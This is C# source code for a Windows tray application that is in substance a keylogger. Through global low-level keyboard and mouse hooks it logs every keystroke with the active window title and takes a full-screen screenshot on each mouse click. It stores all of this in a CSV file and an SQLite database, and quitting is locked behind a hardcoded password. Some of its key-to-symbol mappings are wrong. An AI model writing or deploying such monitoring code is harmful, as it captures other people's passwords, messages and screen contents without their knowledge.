using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using System.Data.SQLite;
using System.IO;
using CsvHelper;
//using Microsoft.VisualBasic.FileIO;

namespace KeyboardTrayApp
{
    public class PasswordForm : Form
    {
        private Label lblPrompt;
        private TextBox txtPassword;
        private Button btnSubmit;

        public string Password { get; private set; }

        public PasswordForm(string prompt)
        {
            InitializeComponent();
            lblPrompt.Text = prompt;
        }

        private void InitializeComponent()
        {
            lblPrompt = new Label();
            txtPassword = new TextBox();
            btnSubmit = new Button();

            SuspendLayout();

            // lblPrompt
            lblPrompt.AutoSize = true;
            lblPrompt.Location = new Point(12, 18);
            lblPrompt.Name = "lblPrompt";
            lblPrompt.Size = new Size(68, 15);
            lblPrompt.TabIndex = 0;
            lblPrompt.Text = "Enter password:";

            // txtPassword
            txtPassword.Location = new Point(15, 36);
            txtPassword.Name = "txtPassword";
            txtPassword.PasswordChar = '*';
            txtPassword.Size = new Size(200, 23);
            txtPassword.TabIndex = 1;

            // btnSubmit
            btnSubmit.Location = new Point(15, 65);
            btnSubmit.Name = "btnSubmit";
            btnSubmit.Size = new Size(75, 23);
            btnSubmit.TabIndex = 2;
            btnSubmit.Text = "Submit";
            btnSubmit.UseVisualStyleBackColor = true;
            btnSubmit.Click += btnSubmit_Click;

            // PasswordForm
            AutoScaleDimensions = new SizeF(7F, 15F);
            AutoScaleMode = AutoScaleMode.Font;
            ClientSize = new Size(230, 100);
            Controls.Add(lblPrompt);
            Controls.Add(txtPassword);
            Controls.Add(btnSubmit);
            FormBorderStyle = FormBorderStyle.FixedSingle;
            MaximizeBox = false;
            MinimizeBox = false;
            Name = "PasswordForm";
            ShowIcon = false;
            StartPosition = FormStartPosition.CenterScreen;
            Text = "Password Form";

            ResumeLayout(false);
            PerformLayout();
        }

        private void btnSubmit_Click(object sender, EventArgs e)
        {
            Password = txtPassword.Text;
            DialogResult = DialogResult.OK;
        }
    }
    public class KeyboardTrayApp : ApplicationContext
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WH_MOUSE_LL = 14;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_KEYUP = 0x0101;
        private const int WM_SYSKEYDOWN = 0x0104;
        private const int WM_SYSKEYUP = 0x0105;
        private const int WM_LBUTTONDOWN = 0x0201;
        private const int WM_RBUTTONDOWN = 0x0204;

        private IntPtr keyboardHookId = IntPtr.Zero;
        private IntPtr mouseHookId = IntPtr.Zero;
        private LowLevelKeyboardProc keyboardProc;
        private LowLevelMouseProc mouseProc;
        private NotifyIcon notifyIcon;
        private StringBuilder keyBuffer;
        private StringBuilder dataBuffer;
        private string logFilePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "keyboard_log.csv");
        private string screenshotFolderPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "Screenshots");
        private string databaseFilePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "keyboard_log.db");
        private string password = "12345";

        private bool isModifierKeyPressed = false;
        private SQLiteConnection connection;

        private bool shiftPressed = false;

        private bool toggleCaseMode = false;

        private bool isCtrlPressed = false;

        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern short GetKeyState(int keyCode);

        public KeyboardTrayApp()
        {
            keyboardProc = KeyboardHookCallback;
            mouseProc = MouseHookCallback;
            keyboardHookId = SetHook(keyboardProc);
            mouseHookId = SetHook(mouseProc);

            keyBuffer = new StringBuilder();
            dataBuffer = new StringBuilder();

            InitializeTrayIcon();
            InitializeDatabase();

            // Create the log file and write the headers
            using (StreamWriter writer = new StreamWriter(logFilePath, true))
            {
                writer.WriteLine("Timestamp,Key Sequence,Active Application,Screenshot,Data");
            }

            // Create the Screenshots folder if it doesn't exist
            Directory.CreateDirectory(screenshotFolderPath);
        }

        private void InitializeTrayIcon()
        {
            notifyIcon = new NotifyIcon();
            notifyIcon.Icon = SystemIcons.Application;
            notifyIcon.Text = "Keyboard Tray App";
            notifyIcon.Visible = true;

            ContextMenuStrip contextMenuStrip = new ContextMenuStrip();
            ToolStripMenuItem exitMenuItem = new ToolStripMenuItem("Exit", null, OnExitMenuItemClick);
            contextMenuStrip.Items.Add(exitMenuItem);

            notifyIcon.ContextMenuStrip = contextMenuStrip;
        }
        private void InitializeDatabase()
        {
            connection = new SQLiteConnection($"Data Source={databaseFilePath};Version=3;");
            connection.Open();

            using (var command = new SQLiteCommand(connection))
            {
                command.CommandText = @"CREATE TABLE IF NOT EXISTS KeyboardLog (
                    ID INTEGER PRIMARY KEY AUTOINCREMENT,
                    Timestamp TEXT,
                    KeySequence TEXT,
                    ActiveApplication TEXT,
                    ScreenshotPath TEXT,
                    Data TEXT
                );";
                command.ExecuteNonQuery();
            }
        }

        private void OnExitMenuItemClick(object sender, EventArgs e)
        {
            string enteredPassword = PromptPassword("Enter password:");
            if (enteredPassword == password)
            {
                notifyIcon.Visible = false;
                Application.Exit();
            }
            else
            {
                MessageBox.Show("Incorrect password. Please try again.", "Invalid Password", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private string PromptPassword(string prompt)
        {
            using (PasswordForm passwordForm = new PasswordForm(prompt))
            {
                if (passwordForm.ShowDialog() == DialogResult.OK)
                {
                    return passwordForm.Password;
                }
            }
            return null;
        }


        protected override void Dispose(bool disposing)
        {
            if (disposing)
            {
                if (keyboardHookId != IntPtr.Zero)
                {
                    UnhookWindowsHookEx(keyboardHookId);
                    keyboardHookId = IntPtr.Zero;
                }

                if (mouseHookId != IntPtr.Zero)
                {
                    UnhookWindowsHookEx(mouseHookId);
                    mouseHookId = IntPtr.Zero;
                }

                notifyIcon.Dispose();
            }
            base.Dispose(disposing);
        }

        private IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process currentProcess = Process.GetCurrentProcess())
            using (ProcessModule currentModule = currentProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(currentModule.ModuleName), 0);
            }
        }

        private IntPtr SetHook(LowLevelMouseProc proc)
        {
            using (Process currentProcess = Process.GetCurrentProcess())
            using (ProcessModule currentModule = currentProcess.MainModule)
            {
                return SetWindowsHookEx(WH_MOUSE_LL, proc, GetModuleHandle(currentModule.ModuleName), 0);
            }
        }

        private IntPtr KeyboardHookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            string keySequence = keyBuffer.ToString();
            string screenshotPath = Path.Combine(screenshotFolderPath, $"screenshot_{DateTime.Now:yyyyMMdd_HHmmss}.png");
            string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");

            string activeApplication = GetActiveApplication();
            if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN))
            {
                int vkCode = Marshal.ReadInt32(lParam);
                Keys key = (Keys)vkCode;

                bool ctrlPressed = (Control.ModifierKeys & Keys.Control) != 0;
                bool shiftPressed = (Control.ModifierKeys & Keys.Shift) != 0;
                using (var command = new SQLiteCommand(connection))
                {
                    command.CommandText = "INSERT INTO KeyboardLog (Timestamp, KeySequence, ActiveApplication, ScreenshotPath, Data) VALUES (@Timestamp, @KeySequence, @ActiveApplication, @ScreenshotPath, @Data)";
                    command.Parameters.AddWithValue("@Timestamp", timestamp);
                    command.Parameters.AddWithValue("@KeySequence", keySequence);
                    command.Parameters.AddWithValue("@ActiveApplication", activeApplication);
                    command.Parameters.AddWithValue("@ScreenshotPath", screenshotPath);
                    command.Parameters.AddWithValue("@Data", dataBuffer.ToString());
                    command.ExecuteNonQuery();
                }

                if (key == Keys.LControlKey || key == Keys.RControlKey)
                {
                    isCtrlPressed = true;
                }

                if (isCtrlPressed && key != Keys.ControlKey)
                {
                    // Append the key to the key sequence buffer
                    string keyName = GetKeyName(key, shiftPressed);
                    keyBuffer.Append(keyName);
                }
                else
                {
                    // Handle other keys and append to the data buffer
                    if (key != Keys.S || !isCtrlPressed)
                    {
                        string keyName = GetKeyName(key, shiftPressed);
                        keyBuffer.Append(keyName);

                        // Handle special keys
                        if (key == Keys.Space)
                        {
                            dataBuffer.Append(" ");
                        }
                        else if (key == Keys.Back && dataBuffer.Length > 0)
                        {
                            dataBuffer.Remove(dataBuffer.Length - 1, 1);
                        }
                        else if ((key >= Keys.Oem1 && key <= Keys.Oem102) || key == Keys.Decimal)
                        {
                            char keyValue = GetKeyValue(key, shiftPressed);
                            dataBuffer.Append(keyValue);
                        }
                        else if (IsCustomSymbolKey(key))
                        {
                            string keyValue = GetSymbolValue(key, shiftPressed);
                            dataBuffer.Append(keyValue);
                        }
                        else if (key >= Keys.NumPad0 && key <= Keys.NumPad9)
                        {
                            char keyValue = (char)('0' + (key - Keys.NumPad0));
                            dataBuffer.Append(keyValue);
                        }
                        else
                        {
                            if (!isModifierKeyPressed)
                            {
                                if (Char.IsLetter((char)key))
                                {
                                    bool isCapsLockOn = Control.IsKeyLocked(Keys.CapsLock);
                                    char letter = GetLetterFromKey((char)key, isCapsLockOn, shiftPressed);
                                    dataBuffer.Append(letter);
                                }
                            }
                            else
                            {
                                isModifierKeyPressed = false;
                            }
                        }
                    }
                }
            }
            else if (nCode >= 0 && (wParam == (IntPtr)WM_KEYUP || wParam == (IntPtr)WM_SYSKEYUP))
            {
                int vkCode = Marshal.ReadInt32(lParam);
                Keys key = (Keys)vkCode;

                if (key == Keys.LControlKey || key == Keys.RControlKey)
                {
                    isCtrlPressed = false;
                }
                else if (key == Keys.LShiftKey || key == Keys.RShiftKey ||
                         key == Keys.CapsLock || key == Keys.Enter)
                {
                    isModifierKeyPressed = false;
                }
            }

            return CallNextHookEx(keyboardHookId, nCode, wParam, lParam);
        }

        private char GetLetterFromKey(char key, bool isCapsLockOn, bool shiftPressed)
        {
            bool isLowerCase = Char.IsLower(key);
            bool isUpperCase = Char.IsUpper(key);

            if (isLowerCase || isUpperCase)
            {
                bool shouldConvertToLowerCase = ((!isCapsLockOn && !shiftPressed && isUpperCase) ||
                                                 (isCapsLockOn && shiftPressed && isUpperCase));

                bool shouldConvertToUpperCase = ((!isCapsLockOn && shiftPressed && isLowerCase) ||
                                                 (isCapsLockOn && !shiftPressed && isLowerCase));

                if (shouldConvertToLowerCase)
                {
                    return Char.ToLower(key);
                }
                else if (shouldConvertToUpperCase)
                {
                    return Char.ToUpper(key);
                }
            }

            return key;
        }







        private bool IsCustomSymbolKey(Keys key)
        {
            switch (key)
            {
                case Keys.D0:
                case Keys.D1:
                case Keys.D2:
                case Keys.D3:
                case Keys.D4:
                case Keys.D5:
                case Keys.D6:
                case Keys.D7:
                case Keys.D8:
                case Keys.D9:
                case Keys.OemOpenBrackets:
                case Keys.OemCloseBrackets:
                case Keys.OemPipe:
                case Keys.OemSemicolon:
                case Keys.OemQuotes:
                case Keys.Oemcomma:
                case Keys.OemPeriod:
                case Keys.OemQuestion:
                    return true;
                default:
                    return false;
            }
        }


        private string GetSymbolValue(Keys key, bool shiftPressed)
        {
            if (key == Keys.Oemcomma)
            {
                return shiftPressed ? ">" : ",";
            }
            else
            {
                switch (key)
                {
                    case Keys.D0:
                        return shiftPressed ? ")" : "0";
                    case Keys.D1:
                        return shiftPressed ? "!" : "1";
                    case Keys.D2:
                        return shiftPressed ? "@" : "2";
                    case Keys.D3:
                        return shiftPressed ? "#" : "3";
                    case Keys.D4:
                        return shiftPressed ? "$" : "4";
                    case Keys.D5:
                        return shiftPressed ? "%" : "5";
                    case Keys.D6:
                        return shiftPressed ? "^" : "6";
                    case Keys.D7:
                        return shiftPressed ? "&" : "7";
                    case Keys.D8:
                        return shiftPressed ? "*" : "8";
                    case Keys.D9:
                        return shiftPressed ? "(" : "9";
                    case Keys.OemOpenBrackets:
                        return shiftPressed ? ")" : "(";
                    case Keys.OemCloseBrackets:
                        return shiftPressed ? "!" : ")";
                    case Keys.OemPipe:
                        return shiftPressed ? "@" : "*";
                    case Keys.OemSemicolon:
                        return shiftPressed ? "#" : "%";
                    case Keys.OemQuotes:
                        return shiftPressed ? "$" : "'";
                    case Keys.Oemcomma:
                        return shiftPressed ? "<" : ",";
                    case Keys.OemPeriod:
                        return shiftPressed ? "&" : ".";
                    case Keys.OemQuestion:
                        return shiftPressed ? "*" : "/";
                    default:
                        return "";
                }
            }
        }




        private IntPtr MouseHookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && (wParam == (IntPtr)WM_LBUTTONDOWN || wParam == (IntPtr)WM_RBUTTONDOWN))
            {
                // Take a screenshot when the mouse button is clicked
                string screenshotPath = Path.Combine(screenshotFolderPath, $"screenshot_{DateTime.Now:yyyyMMdd_HHmmss}.png");
                using (Bitmap screenshot = CaptureScreen())
                {
                    // Get the mouse cursor position
                    Point mousePosition = Cursor.Position;

                    // Draw a red pointer at the mouse position
                    using (Graphics graphics = Graphics.FromImage(screenshot))
                    {
                        using (Pen pen = new Pen(Color.Red, 3))
                        {
                            graphics.DrawLine(pen, mousePosition.X - 10, mousePosition.Y, mousePosition.X + 10, mousePosition.Y);
                            graphics.DrawLine(pen, mousePosition.X, mousePosition.Y - 10, mousePosition.X, mousePosition.Y + 10);
                        }
                    }

                    // Save the modified screenshot
                    screenshot.Save(screenshotPath);
                }

                // Write the log entry
                string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
                string keySequence = keyBuffer.ToString();
                string activeApplication = GetActiveApplication();
                string logEntry = $"{timestamp},{keySequence},{activeApplication},{screenshotPath},{dataBuffer.ToString()}";
                using (StreamWriter writer = new StreamWriter(logFilePath, true))
                {
                    writer.WriteLine(logEntry);
                }

                // Reset the key buffer
                keyBuffer.Clear();
                dataBuffer.Clear();
            }

            return CallNextHookEx(mouseHookId, nCode, wParam, lParam);
        }

        private string GetActiveApplication()
        {
            IntPtr handle = GetForegroundWindow();
            StringBuilder title = new StringBuilder(256);
            if (GetWindowText(handle, title, title.Capacity) > 0)
            {
                return title.ToString();
            }
            return string.Empty;
        }

        private Bitmap CaptureScreen()
        {
            Rectangle bounds = Screen.GetBounds(Point.Empty);
            Bitmap screenshot = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppArgb);
            using (Graphics graphics = Graphics.FromImage(screenshot))
            {
                graphics.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
            }
            return screenshot;
        }

        private char GetKeyValue(Keys key, bool shiftPressed)
        {
            switch (key)
            {
                case Keys.D0:
                    return shiftPressed ? ')' : '0';
                case Keys.D1:
                    return shiftPressed ? '!' : '1';
                case Keys.D2:
                    return shiftPressed ? '@' : '2';
                case Keys.D3:
                    return shiftPressed ? '#' : '3';
                case Keys.D4:
                    return shiftPressed ? '$' : '4';
                case Keys.D5:
                    return shiftPressed ? '%' : '5';
                case Keys.D6:
                    return shiftPressed ? '^' : '6';
                case Keys.D7:
                    return shiftPressed ? '&' : '7';
                case Keys.D8:
                    return shiftPressed ? '*' : '8';
                case Keys.D9:
                    return shiftPressed ? '(' : '9';
                case Keys.OemMinus:
                    return shiftPressed ? '_' : '-';
                case Keys.Oemplus:
                    return shiftPressed ? '+' : '=';
                case Keys.OemOpenBrackets:
                    return shiftPressed ? '{' : '[';
                case Keys.OemCloseBrackets:
                    return shiftPressed ? '}' : ']';
                case Keys.OemPipe:
                    return shiftPressed ? '|' : '\\';
                case Keys.OemSemicolon:
                    return shiftPressed ? ':' : ';';
                case Keys.OemQuotes:
                    return shiftPressed ? '"' : '\'';
                case Keys.Oemcomma:
                    return shiftPressed ? '<' : ',';
                case Keys.OemPeriod:
                    return shiftPressed ? '>' : '.';
                case Keys.OemQuestion:
                    return shiftPressed ? '?' : '/';
                default:
                    return (char)key;
            }
        }


        public static string GetKeyName(Keys key, bool shiftPressed)
        {
            bool isShifted = (shiftPressed && !Console.CapsLock) || (!shiftPressed && Console.CapsLock);

            switch (key)
            {
                // Navigation keys
                case Keys.Up:
                    return "[Up]";
                case Keys.Down:
                    return "[Down]";
                case Keys.Left:
                    return "[Left]";
                case Keys.Right:
                    return "[Right]";
                case Keys.Home:
                    return "[Home]";
                case Keys.End:
                    return "[End]";
                case Keys.PageUp:
                    return "[Page Up]";
                case Keys.PageDown:
                    return "[Page Down]";

                // Function keys
                case Keys.F1:
                    return "F1";
                case Keys.F2:
                    return "F2";
                case Keys.F3:
                    return "F3";
                case Keys.F4:
                    return "F4";
                case Keys.F5:
                    return "F5";
                case Keys.F6:
                    return "F6";
                case Keys.F7:
                    return "F7";
                case Keys.F8:
                    return "F8";
                case Keys.F9:
                    return "F9";
                case Keys.F10:
                    return "F10";
                case Keys.F11:
                    return "F11";
                case Keys.F12:
                    return "F12";

                // Control keys
                case Keys.ControlKey:
                    return "[Ctrl]";
                case Keys.Menu:
                    return "[Alt]";
                case Keys.ShiftKey:
                    return "[Shift]";

                // Modifier keys
                case Keys.LWin:
                case Keys.RWin:
                    return "[Windows]";
                case Keys.LControlKey:
                case Keys.RControlKey:
                    return "[Ctrl]";
                case Keys.LMenu:
                case Keys.RMenu:
                    return "[Alt]";
                case Keys.LShiftKey:
                case Keys.RShiftKey:
                    return "[Shift]";

                case Keys.D0:
                    return shiftPressed ? "Shift+)" : "0";
                case Keys.D1:
                    return shiftPressed ? "Shift+!" : "1";
                case Keys.D2:
                    return shiftPressed ? "Shift+@" : "2";
                case Keys.D3:
                    return shiftPressed ? "Shift+#" : "3";
                case Keys.D4:
                    return shiftPressed ? "Shift+$" : "4";
                case Keys.D5:
                    return shiftPressed ? "Shift+%" : "5";
                case Keys.D6:
                    return shiftPressed ? "Shift+^" : "6";
                case Keys.D7:
                    return shiftPressed ? "Shift+&" : "7";
                case Keys.D8:
                    return shiftPressed ? "Shift+*" : "8";
                case Keys.D9:
                    return shiftPressed ? "Shift+(" : "9";
                case Keys.OemMinus:
                    return shiftPressed ? "Shift+_" : "-";
                case Keys.Oemplus:
                    return shiftPressed ? "Shift+=" : "=";
                case Keys.OemOpenBrackets:
                    return shiftPressed ? "Shift+{" : "[";
                case Keys.OemCloseBrackets:
                    return shiftPressed ? "Shift+}" : "]";
                case Keys.OemPipe:
                    return shiftPressed ? "Shift+|" : "\\";
                case Keys.OemSemicolon:
                    return shiftPressed ? "Shift+:" : ";";
                case Keys.OemQuotes:
                    return shiftPressed ? "Shift+\"" : "'";
                case Keys.Oemcomma:
                    return shiftPressed ? "Shift+<" : ",";
                case Keys.OemPeriod:
                    return shiftPressed ? "Shift+>" : ".";
                case Keys.OemQuestion:
                    return shiftPressed ? "Shift+?" : "/";



                // Backspace, Enter, Caps Lock, Num Lock, and Numeric Keys
                case Keys.Enter:
                    return "[Enter]";
                case Keys.CapsLock:
                    return "[Caps Lock]";
                case Keys.NumLock:
                    return "[Num Lock]";
                case Keys.Tab:
                    return "[Tab]";
                case Keys.Space:
                    return "[SpaceBar]";



                // Default case
                default:
                    return key.ToString();
            }
        }




        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private delegate IntPtr LowLevelMouseProc(int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelMouseProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);


        public class Program
        {
            [STAThread]
            public static void Main()
            {
                Application.Run(new KeyboardTrayApp());
            }
        }
    }
}